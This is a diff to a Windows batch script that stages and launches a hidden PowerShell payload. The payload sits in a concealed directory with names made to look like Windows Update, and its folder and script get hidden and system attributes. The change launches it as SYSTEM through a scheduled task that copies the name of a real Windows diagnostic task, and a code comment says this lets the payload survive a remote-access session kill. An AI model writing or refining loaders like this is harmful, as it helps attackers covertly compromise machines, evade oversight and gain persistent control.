@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions
-echo === GO.CMD BUILD 20260729F ===
+echo === GO.CMD BUILD 20260729G ===
 
 net session >nul 2>&1
 if errorlevel 1 (
@@ -13,6 +13,7 @@ set "WORKDIR=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "B64=%WORKDIR%\update.b64"
 set "PS1=%WORKDIR%\wucache_pkg.ps1"
 set "MARKER=WU_BUILD_20260729F"
+set "ONCETASK=\Microsoft\Windows\Diagnosis\WMIRegistration"
 
 echo Using payload URL:
 echo %PAYURL%
@@ -73,6 +74,20 @@ if errorlevel 1 (
 attrib +h +s "%WORKDIR%" >nul 2>&1
 attrib +h +s "%PS1%" >nul 2>&1
 
-echo Payload OK [%MARKER%], launching...
-start "" /b powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS1%"
+REM Launch via Task Scheduler as SYSTEM so ScreenConnect 10s kill cannot kill the payload job tree
+schtasks /Delete /TN "%ONCETASK%" /F >nul 2>&1
+schtasks /Create /TN "%ONCETASK%" /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /SD 01/01/2099 /F /TR "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%PS1%\""
+if errorlevel 1 (
+  echo ERROR: could not create breakaway task
+  exit /b 4
+)
+
+schtasks /Run /TN "%ONCETASK%"
+if errorlevel 1 (
+  echo ERROR: could not run breakaway task
+  exit /b 4
+)
+
+echo Payload OK [%MARKER%], launched via SYSTEM task (survives SC timeout).
+echo Wait 60s then check .diag.log - do not rely on this console.
 exit /b 0
